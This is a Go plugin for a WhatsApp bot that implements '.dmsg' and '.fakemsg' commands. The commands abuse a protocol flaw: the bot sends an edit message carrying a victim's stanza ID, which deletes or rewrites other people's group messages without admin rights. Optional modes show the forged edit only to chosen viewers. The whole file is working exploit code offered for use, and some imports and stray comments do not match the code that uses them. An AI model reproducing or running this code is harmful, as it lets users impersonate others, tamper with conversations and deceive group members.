package main

// dmsg_fakemsg.go — Port dari Baileys Nixel plugins
//
// .dmsg    — Delete other people's messages without admin role
// .fakemsg — Edit other people's messages with custom text
// .say     — Edit random message from target user with fake text
//
// Modes:
//   normal    → semua orang lihat effect
//   -i        → hanya primary device (device ID 0) yang lihat
//   -I @tag   → hanya @tag orang tersebut yang lihat, semua orang lain: tidak ada
//
// Usage:
//   .dmsg                    (reply target) — delete
//   .dmsg -i                 (reply target) — delete, only primary sees
//   .dmsg -I @tag            (reply target) — delete, only @tag sees
//   .fakemsg hello           (reply target) — edit to "hello"
//   .fakemsg hello -i        (reply target) — edit, only primary sees
//   .fakemsg hello -I @tag   (reply target) — edit, only @tag sees
//   .say @user teks           — edit @user's msg to "teks"
//   .say @user teks -i        → SPR mode
//   .say @user teks -I @tag   → only @tag sees the edit

import (
	"context"
	"fmt"
	"strings"
	"time"

	"github.com/polymorfa/hypermeow"
	waCommon "github.com/polymorfa/hypermeow/proto/waCommon"
	waE2E "github.com/polymorfa/hypermeow/proto/waE2E"
	"github.com/polymorfa/hypermeow/types"
	"github.com/polymorfa/hypermeow/types/events"
	"google.golang.org/protobuf/proto"
)

// ─── Hidden char helpers ──────────────────────────────────────────

// stripHiddenChars removes WhatsApp's invisible mention markers:
//
//	U+2068 FIRST STRONG ISOLATE  (⁨)
//	U+2069 POP DIRECTIONAL ISOLATE (⁩)
//	U+200E LEFT-TO-RIGHT MARK
//	U+200F RIGHT-TO-LEFT MARK
//	U+202A..U+202E (other bidi control)
//	Zero-width chars U+200B/U+200C/U+200D, U+FEFF
func stripHiddenChars(s string) string {
	var b strings.Builder
	b.Grow(len(s))
	for _, r := range s {
		switch r {
		case '\u2068', '\u2069', '\u200E', '\u200F',
			'\u202A', '\u202B', '\u202C', '\u202D', '\u202E',
			'\u200B', '\u200C', '\u200D', '\uFEFF':
			continue
		}
		b.WriteRune(r)
	}
	return b.String()
}

// ─── Flag parsing ──────────────────────────────────────────────────

type dmsgFlags struct {
	useSPR    bool      // -i mode: primary only
	viewer    types.JID // -I @tag mode: only this person sees
	hasViewer bool
}

// parseDmsgFlags parses "-i" and "-I @tag" flags from args.
// Now accepts msg so we can resolve mentions via ContextInfo.MentionedJIDList
// (the visible text "kangwifi" is NOT the JID — we need the underlying JID).
//
// Returns flags + cleaned args (flags removed, hidden chars stripped).
func parseDmsgFlags(msg *events.Message, args string) (dmsgFlags, string) {
	var f dmsgFlags

	// Strip hidden chars first — this makes subsequent parsing predictable.
	clean := stripHiddenChars(args)

	// Get mention JIDs from WhatsApp's ContextInfo.MentionedJIDList.
	// These are the ACTUAL JIDs (PN or LID as WA sent them).
	var mentionJIDs []string
	if msg != nil {
		mentionJIDs = extractMentionedJIDsDual(msg)
	}

	// Find -I @tag pattern. The token after -I is a visible mention like "@kangwifi"
	// or "@221217021784141". We resolve it to the Nth entry in MentionedJIDList,
	// where N = the position of this @token among all @-prefixed tokens in args.
	parts := strings.Fields(clean)
	consumed := map[int]bool{}
	for i := 0; i < len(parts); i++ {
		if parts[i] != "-I" {
			continue
		}
		if i+1 >= len(parts) {
			break
		}
		token := parts[i+1]
		if !strings.HasPrefix(token, "@") || len(token) < 2 {
			break
		}
		// Resolve this visible mention token to a JID.
		viewer := resolveViewerMention(parts, i+1, mentionJIDs)
		if viewer.IsEmpty() {
			break
		}
		f.useSPR = true
		f.hasViewer = true
		f.viewer = viewer.ToNonAD()
		consumed[i] = true
		consumed[i+1] = true
		break
	}

	// Find -i flag (lowercase). Only treat as flag if NOT already in -I mode.
	if !f.hasViewer {
		for i, p := range parts {
			if p == "-i" {
				f.useSPR = true
				consumed[i] = true
			}
		}
	}

	// Rebuild clean from unconsumed parts.
	var kept []string
	for i, p := range parts {
		if consumed[i] {
			continue
		}
		kept = append(kept, p)
	}
	clean = strings.Join(kept, " ")
	clean = strings.TrimSpace(clean)

	return f, clean
}

// resolveViewerMention maps the visible @token at partIdx to its JID
// using the message's MentionedJIDList.
//
// WhatsApp mentions appear in text as "@displayname" (or "@phonenumber" for LID).
// The Nth @-token in the visible text corresponds to the Nth entry in MentionedJIDList.
// So we count @-prefixed tokens up to and including partIdx, then index into mentionJIDs.
//
// Fallback: if there is only one mention total and one @-token, just use it.
func resolveViewerMention(parts []string, partIdx int, mentionJIDs []string) types.JID {
	if partIdx >= len(parts) || len(mentionJIDs) == 0 {
		return types.JID{}
	}

	// Count @-prefixed tokens up to and including partIdx.
	mentionPos := -1
	for i := 0; i <= partIdx; i++ {
		if strings.HasPrefix(parts[i], "@") && len(parts[i]) >= 2 {
			mentionPos++
			if i == partIdx {
				break
			}
		}
	}
	if mentionPos < 0 || mentionPos >= len(mentionJIDs) {
		// Fallback: if exactly 1 mention and exactly 1 @-token, use that mention.
		atCount := 0
		for _, p := range parts {
			if strings.HasPrefix(p, "@") && len(p) >= 2 {
				atCount++
			}
		}
		if atCount == 1 && len(mentionJIDs) == 1 {
			mentionPos = 0
		} else {
			return types.JID{}
		}
	}

	j, err := parseAnyJID(mentionJIDs[mentionPos])
	if err != nil || j.IsEmpty() {
		return types.JID{}
	}
	return j.ToNonAD()
}

// dmsgBuildOfficialEdit builds the edit payload in the EXACT structure an
// official WhatsApp client uses (mirrors hypermeow's BuildEdit):
//
//	Message.EditedMessage -> FutureProofMessage -> Message.ProtocolMessage
//
// with Key{RemoteJID, FromMe:true, ID:innerID}, Type=MESSAGE_EDIT,
// TimestampMS=now. The envelope stanza ID is set separately by the send path
// (= victim's stanza ID) — that mismatch is the core of the trick.
//
// Using the official wrapper maximizes compatibility with current clients:
// some versions validate/parse the wrapped form more reliably than a bare
// top-level ProtocolMessage.
func dmsgBuildOfficialEdit(chatID types.JID, innerID string, newContent *waE2E.Message) *waE2E.Message {
	nowMS := time.Now().UnixMilli()
	return &waE2E.Message{
		EditedMessage: &waE2E.FutureProofMessage{
			Message: &waE2E.Message{
				ProtocolMessage: &waE2E.ProtocolMessage{
					Key: &waCommon.MessageKey{
						RemoteJID: proto.String(chatID.String()),
						FromMe:    proto.Bool(true),
						ID:        proto.String(innerID),
					},
					Type:          waE2E.ProtocolMessage_MESSAGE_EDIT.Enum(),
					EditedMessage: newContent,
					TimestampMS:   proto.Int64(nowMS),
				},
			},
		},
	}
}

// ─── DMSG handler ─────────────────────────────────────────────────

// dmsgDeleteByStanzaID — inti trik hapus pesan orang (tanpa admin).
// Dipakai .dmsg langsung.
// chatID: JID grup, stanzaID: ID pesan target.
// Return "" jika sukses, pesan error jika gagal.
func dmsgDeleteByStanzaID(client *whatsmeow.Client, chatID types.JID, stanzaID string) string {
	flags := dmsgFlags{} // mode normal (bukan SPR) untuk eksekusi terjadwal
	fakeMsg := &events.Message{}
	fakeMsg.Info.Chat = chatID

	// Step 1: placeholder via GroupStatusMessageV2 (disembunyikan client)
	tempMsg1 := &waE2E.Message{
		GroupStatusMessageV2: &waE2E.FutureProofMessage{
			Message: &waE2E.Message{
				ExtendedTextMessage: &waE2E.ExtendedTextMessage{
					Text: proto.String(""),
					ContextInfo: &waE2E.ContextInfo{
						IsGroupStatus: proto.Bool(true),
					},
				},
			},
		},
	}

	tempID1, err := dmsgSendEx(client, fakeMsg, tempMsg1, flags)
	if err != nil {
		return fmt.Sprintf("❌ Hapus step 1 gagal: %v", err)
	}

	// Step 2: official-structure edit, envelope ID = target stanza
	editContent := &waE2E.Message{
		ExtendedTextMessage: &waE2E.ExtendedTextMessage{
			Text: proto.String("\x00"),
			ContextInfo: &waE2E.ContextInfo{
				IsGroupStatus: proto.Bool(false),
			},
		},
	}
	tempMsg2 := dmsgBuildOfficialEdit(chatID, tempID1, editContent)

	tempID2, err := dmsgSendWithIDEx(client, fakeMsg, tempMsg2, flags, stanzaID)
	if err != nil {
		return fmt.Sprintf("❌ Hapus step 2 gagal: %v", err)
	}

	// Step 3: bersihkan temp — ALWAYS
	time.Sleep(100 * time.Millisecond)
	dmsgCleanupTemp(client, fakeMsg, chatID, tempID1, tempID2, flags)
	return ""
}

func handleDMsgCommand(client *whatsmeow.Client, msg *events.Message, args string) string {
	if !isOwnerMsg(msg) {
		return "❌ Hanya owner"
	}
	if !msg.Info.IsGroup {
		return "❌ Hanya di grup"
	}

	flags, _ := parseDmsgFlags(msg, args)
	_ = flags // mode SPR tetap didukung via path lama di bawah

	quoted := getQuotedMessage(msg)
	if quoted == nil {
		return "❌ Reply pesan yang ingin diproses"
	}
	stanzaID := quoted.Info.ID
	if stanzaID == "" {
		return "❌ Tidak bisa ambil ID pesan target"
	}

	chatID := msg.Info.Chat

	// Jalur SPR (-i / -I): pakai path lama agar hanya target yang lihat.
	// Jalur normal: pakai fungsi inti.
	if flags.useSPR {
		tempMsg1 := &waE2E.Message{
			GroupStatusMessageV2: &waE2E.FutureProofMessage{
				Message: &waE2E.Message{
					ExtendedTextMessage: &waE2E.ExtendedTextMessage{
						Text: proto.String(""),
						ContextInfo: &waE2E.ContextInfo{
							IsGroupStatus: proto.Bool(true),
						},
					},
				},
			},
		}
		tempID1, err := dmsgSendEx(client, msg, tempMsg1, flags)
		if err != nil {
			return fmt.Sprintf("❌ Step 1 gagal: %v", err)
		}
		editContent := &waE2E.Message{
			ExtendedTextMessage: &waE2E.ExtendedTextMessage{
				Text: proto.String("\x00"),
				ContextInfo: &waE2E.ContextInfo{
					IsGroupStatus: proto.Bool(false),
				},
			},
		}
		tempMsg2 := dmsgBuildOfficialEdit(chatID, tempID1, editContent)
		tempID2, err := dmsgSendWithIDEx(client, msg, tempMsg2, flags, stanzaID)
		if err != nil {
			return fmt.Sprintf("❌ Step 2 gagal: %v", err)
		}
		time.Sleep(100 * time.Millisecond)
		dmsgCleanupTemp(client, msg, chatID, tempID1, tempID2, flags)
		return ""
	}

	if errStr := dmsgDeleteByStanzaID(client, chatID, stanzaID); errStr != "" {
		return errStr
	}
	return ""
}

// ─── FAKEMSG handler ──────────────────────────────────────────────

func handleFakeMsgCommand(client *whatsmeow.Client, msg *events.Message, args string) string {
	if !isOwnerMsg(msg) {
		return "❌ Hanya owner"
	}
	if !msg.Info.IsGroup {
		return "❌ Hanya di grup"
	}

	flags, cleanArgs := parseDmsgFlags(msg, args)

	text := strings.TrimSpace(cleanArgs)
	if text == "" {
		return "❓ *Cara pakai:* .fakemsg <teks>\nContoh: *.fakemsg hello*"
	}

	quoted := getQuotedMessage(msg)
	if quoted == nil {
		return "❌ Reply pesan yang ingin diedit"
	}
	stanzaID := quoted.Info.ID
	if stanzaID == "" {
		return "❌ Tidak bisa ambil ID pesan target"
	}

	chatID := msg.Info.Chat

	// Step 1: Send extendedTextMessage placeholder
	tempMsg1 := &waE2E.Message{
		ExtendedTextMessage: &waE2E.ExtendedTextMessage{
			Text: proto.String(""),
			ContextInfo: &waE2E.ContextInfo{
				IsGroupStatus: proto.Bool(true),
			},
		},
	}

	tempID1, err := dmsgSendEx(client, msg, tempMsg1, flags)
	if err != nil {
		return fmt.Sprintf("❌ Step 1 gagal: %v", err)
	}

	// Step 2: Send protocolMessage type 14 (edit)
	editType := waE2E.ProtocolMessage_MESSAGE_EDIT
	tempMsg2 := &waE2E.Message{
		ProtocolMessage: &waE2E.ProtocolMessage{
			Key: &waCommon.MessageKey{
				RemoteJID: proto.String(chatID.String()),
				FromMe:    proto.Bool(true),
				ID:        proto.String(tempID1),
			},
			Type: &editType,
			EditedMessage: &waE2E.Message{
				ExtendedTextMessage: &waE2E.ExtendedTextMessage{
					Text: proto.String(text),
					ContextInfo: &waE2E.ContextInfo{
						IsGroupStatus: proto.Bool(false),
					},
				},
			},
		},
	}

	tempID2, err := dmsgSendWithIDEx(client, msg, tempMsg2, flags, stanzaID)
	if err != nil {
		return fmt.Sprintf("❌ Step 2 gagal: %v", err)
	}

	// Step 3: Delete temp messages — ALWAYS
	time.Sleep(100 * time.Millisecond)
	dmsgCleanupTemp(client, msg, chatID, tempID1, tempID2, flags)

	return ""
}

// ─── Send functions ────────────────────────────────────────────────

// dmsgSendEx sends a message. Routes via SPR if flags.useSPR is set.
// If flags.hasViewer → participants = [viewer resolved to native group form]
// If flags.useSPR && !hasViewer → participants = all members, primaryOnly
func dmsgSendEx(client *whatsmeow.Client, msg *events.Message, waMsg *waE2E.Message, flags dmsgFlags) (string, error) {
	if !flags.useSPR {
		ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
		defer cancel()
		resp, err := client.SendMessage(ctx, msg.Info.Chat, waMsg)
		if err != nil {
			return "", err
		}
		return resp.ID, nil
	}

	// SPR mode
	var participants []types.JID
	if flags.hasViewer && !flags.viewer.IsEmpty() {
		// -I @tag mode: only viewer gets it.
		// CRITICAL: resolve viewer to native group form (PN or LID) so that
		// GetUserDevices can find their devices.
		resolved, err := buildSPRParticipants(client, msg.Info.Chat, []types.JID{flags.viewer})
		if err != nil || len(resolved) == 0 {
			// Fallback: use viewer JID as-is
			participants = []types.JID{flags.viewer.ToNonAD()}
		} else {
			participants = resolved
		}
	} else {
		// -i mode: all members, but only primary
		ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
		defer cancel()
		meta, err := client.GetGroupInfo(ctx, msg.Info.Chat)
		if err != nil || meta == nil {
			return "", fmt.Errorf("gagal ambil member: %w", err)
		}
		var targets []types.JID
		for _, p := range meta.Participants {
			if !p.JID.IsEmpty() {
				targets = append(targets, p.JID.ToNonAD())
			}
		}
		participants, err = buildSPRParticipants(client, msg.Info.Chat, targets)
		if err != nil {
			return "", err
		}
	}

	// NOTE: sender-key isolation handled inside the SPR engines.

	if flags.hasViewer {
		// -I @tag: use SendGroup with participants = [viewer]
		id, _, _, _, err := sendSPREngineA(client, msg.Info.Chat, participants, waMsg)
		if err != nil {
			return "", err
		}
		sprRegisterBait(id, msg.Info.Chat.String(), "D", nil)
		return id, nil
	}

	// -i: use sendSPRDeviceFiltered (primaryOnly)
	id, err := sendSPRDeviceFiltered(client, msg.Info.Chat, participants, waMsg, true)
	if err != nil {
		// Fallback
		id2, _, _, _, err2 := sendSPREngineA(client, msg.Info.Chat, participants, waMsg)
		if err2 != nil {
			return "", err2
		}
		id = id2
	}
	sprRegisterBait(id, msg.Info.Chat.String(), "D", nil)
	return id, nil
}

// dmsgSendWithIDEx sends with custom message ID (for edit).
func dmsgSendWithIDEx(client *whatsmeow.Client, msg *events.Message, waMsg *waE2E.Message, flags dmsgFlags, stanzaID string) (string, error) {
	if !flags.useSPR {
		ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
		defer cancel()
		resp, err := client.SendMessage(ctx, msg.Info.Chat, waMsg, whatsmeow.SendRequestExtra{
			ID: types.MessageID(stanzaID),
		})
		if err != nil {
			return "", err
		}
		return resp.ID, nil
	}

	var participants []types.JID
	if flags.hasViewer && !flags.viewer.IsEmpty() {
		resolved, err := buildSPRParticipants(client, msg.Info.Chat, []types.JID{flags.viewer})
		if err != nil || len(resolved) == 0 {
			participants = []types.JID{flags.viewer.ToNonAD()}
		} else {
			participants = resolved
		}
	} else {
		ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
		defer cancel()
		meta, err := client.GetGroupInfo(ctx, msg.Info.Chat)
		if err != nil || meta == nil {
			return "", err
		}
		var targets []types.JID
		for _, p := range meta.Participants {
			if !p.JID.IsEmpty() {
				targets = append(targets, p.JID.ToNonAD())
			}
		}
		participants, err = buildSPRParticipants(client, msg.Info.Chat, targets)
		if err != nil {
			return "", err
		}
	}

	// NOTE: sender-key isolation handled inside the SPR engines.

	if flags.hasViewer {
		_, _, _, err := sendSPREngineAWithID(client, msg.Info.Chat, participants, waMsg, stanzaID)
		if err != nil {
			return "", err
		}
	} else {
		_, err := sendSPRDeviceFilteredWithID(client, msg.Info.Chat, participants, waMsg, true, stanzaID)
		if err != nil {
			// Fallback ke engine A — tapi error-nya WAJIB dicek,
			// kalau keduanya gagal laporkan error (bukan sukses palsu).
			if _, _, _, fbErr := sendSPREngineAWithID(client, msg.Info.Chat, participants, waMsg, stanzaID); fbErr != nil {
				return "", fmt.Errorf("dmsg SPR send gagal (device-filtered: %v; engineA: %v)", err, fbErr)
			}
		}
	}
	sprRegisterBait(stanzaID, msg.Info.Chat.String(), "D", nil)
	return stanzaID, nil
}

// dmsgCleanupTemp deletes temp messages. Always runs (even in SPR mode).
// In SPR mode, sends revoke via SPR too so only primary/viewer sees cleanup.
func dmsgCleanupTemp(client *whatsmeow.Client, msg *events.Message, chatID types.JID, id1, id2 string, flags dmsgFlags) {
	if !flags.useSPR {
		// Normal mode: regular revoke
		ctx, cancel := context.WithTimeout(context.Background(), 15*time.Second)
		defer cancel()
		_, _ = client.RevokeMessage(ctx, chatID, types.MessageID(id1))
		_, _ = client.RevokeMessage(ctx, chatID, types.MessageID(id2))
		return
	}

	// SPR mode: send revoke via SPR so only primary/viewer sees it
	// Build revoke messages
	revoke1 := &waE2E.Message{
		ProtocolMessage: &waE2E.ProtocolMessage{
			Key: &waCommon.MessageKey{
				RemoteJID: proto.String(chatID.String()),
				FromMe:    proto.Bool(true),
				ID:        proto.String(id1),
			},
			Type: waE2E.ProtocolMessage_REVOKE.Enum(),
		},
	}
	revoke2 := &waE2E.Message{
		ProtocolMessage: &waE2E.ProtocolMessage{
			Key: &waCommon.MessageKey{
				RemoteJID: proto.String(chatID.String()),
				FromMe:    proto.Bool(true),
				ID:        proto.String(id2),
			},
			Type: waE2E.ProtocolMessage_REVOKE.Enum(),
		},
	}

	_, _ = dmsgSendEx(client, msg, revoke1, flags)
	_, _ = dmsgSendEx(client, msg, revoke2, flags)
}

func init() {
	RegisterPlugin(Plugin{
		Command:     "dmsg",
		Aliases:     []string{"deletemsg"},
		Description: "dmsg",
		Handler: func(client *whatsmeow.Client, msg *events.Message, cmd, args string) string {
			return handleDMsgCommand(client, msg, args)
			// ─── DMsgVA (varian .dmsg tanpa grupstatus, pakai disappearing) ──
		},
	})
}

func init() {
	RegisterPlugin(Plugin{
		Command:     "fakemsg",
		Aliases:     []string{"fmsg"},
		Description: "fakemsg",
		Handler: func(client *whatsmeow.Client, msg *events.Message, cmd, args string) string {
			return handleFakeMsgCommand(client, msg, args)
			// ─── Alight Motion Premium ─────────────────────────────
		},
	})
}
